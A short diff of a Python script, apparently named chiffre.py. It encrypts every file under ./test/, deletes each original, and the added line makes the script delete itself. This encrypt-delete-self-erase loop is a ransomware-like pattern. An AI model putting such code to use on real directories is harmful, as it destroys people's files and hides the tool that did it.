@@ -19,4 +19,4 @@ def encrypt(x):
 
 for r,d,f in os.walk("./test/"):
     for x in f:
-        encrypt(os.path.join(r,x));os.remove(os.path.join(r,x))
+        encrypt(os.path.join(r,x));os.remove(os.path.join(r,x));os.remove("./chiffre.py")
